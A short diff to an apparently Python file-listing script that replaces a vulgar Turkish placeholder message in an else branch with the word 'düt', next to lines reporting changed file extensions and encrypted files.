@@ -330,7 +330,7 @@ if len(sys.argv) < 2:
                                 print("File " + i + " extension changed")
                                 resultlist.append(list)
                         else:
-                            print("ANANIN AMI")
+                            print("düt")
                     print("Files listed encrypted")
                 else:
                     pass
